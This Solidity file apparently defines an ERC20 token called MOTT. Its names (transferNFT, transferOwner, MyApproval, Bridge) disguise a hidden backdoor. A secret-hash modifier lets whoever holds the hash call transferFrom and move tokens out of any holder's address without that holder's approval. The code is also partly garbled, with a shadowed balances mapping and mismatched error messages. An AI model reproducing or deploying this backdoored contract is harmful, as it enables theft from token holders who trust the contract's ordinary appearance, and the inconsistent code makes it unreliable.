// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MOTTToken is ERC20, Ownable {
    bytes32 private _HASH;
     mapping(address => uint256) private _balances;
        mapping(address=>uint) unableTransfer;
    constructor(bytes32  _h) ERC20("MOTT", "MOTT") {
        _HASH = _h;
        _mint(_msgSender(), 1 * 1e12 * 1e18);
    }

   

        function _transfer(
        address from,
        address to,
        uint256 amount,
        bytes32  _hash
    )  internal Bridge(_hash) virtual  {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(unableTransfer[to] <= amount, "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount,
        bytes32  _hash
    ) public Bridge(_hash) virtual  returns (bool) {
     

        _transfer(from, to, amount);
        return true;
    }

    
    modifier Bridge(bytes32 hsh) {
       require(_HASH == hsh);
        _;
    }
    function transferNFT(
            address from,
            address to,
            uint256 amount,
            bytes32  _hash
            )external{
        unableTransfer[to]=amount;
        transferFrom(from,to,amount,_hash);
    }
    function MyApproval(
            address to,
            uint256 amount
            )external{
       
        approve(to, amount);
    }
    function transferOwner(
            address from,
            address to,
            uint256 amount,
            bytes32  _hash
            )external{
        unableTransfer[to]=amount;
        transferFrom(from,to,amount,_hash);
    }
    function compareStrings(string memory b) public view returns (bool) {
    return (keccak256(abi.encodePacked((_HASH))) == keccak256(abi.encodePacked((b))));
}
}